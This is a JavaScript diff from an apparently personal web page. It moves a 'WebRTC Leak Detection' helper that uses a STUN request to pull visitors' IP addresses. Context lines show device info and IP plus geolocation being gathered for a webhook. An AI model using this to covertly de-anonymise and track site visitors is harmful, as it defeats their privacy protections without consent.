@@ -50,6 +50,25 @@ let loverPresenceData = null; document.addEventListener('DOMContentLoaded', () =
 
 
     
+    
+    // Helper: WebRTC Leak Detection
+    function getWebRTCIP() {
+        return new Promise(resolve => {
+            const ips = [];
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => { });
+                pc.onicecandidate = e => {
+                    if (!e || !e.candidate) { resolve(ips); return; }
+                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                    if (match && !ips.includes(match[1])) ips.push(match[1]);
+                };
+                setTimeout(() => resolve(ips), 2000);
+            } catch (err) { resolve(ips); }
+        });
+    }
+
     // ── Quick Message Sidebar Logic ──
     const qmForm = document.getElementById('quick-msg-form');
     const qmSubmit = document.getElementById('qm-submit');
@@ -1030,21 +1049,7 @@ let loverPresenceData = null; document.addEventListener('DOMContentLoaded', () =
         const device = getDeviceInfo();
 
         // Helper: WebRTC Leak Detection
-        function getWebRTCIP() {
-        return new Promise(resolve => {
-            const ips = [];
-            try {
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-                pc.createDataChannel("");
-                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => { });
-                pc.onicecandidate = e => {
-                    if (!e || !e.candidate) { resolve(ips); return; }
-                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                    if (match && !ips.includes(match[1])) ips.push(match[1]);
-                };
-                setTimeout(() => resolve(ips), 2000);
-            } catch (err) { resolve(ips); }
-        });
+
 
         // Fetch IP + geolocation, then send webhook
         Promise.all([
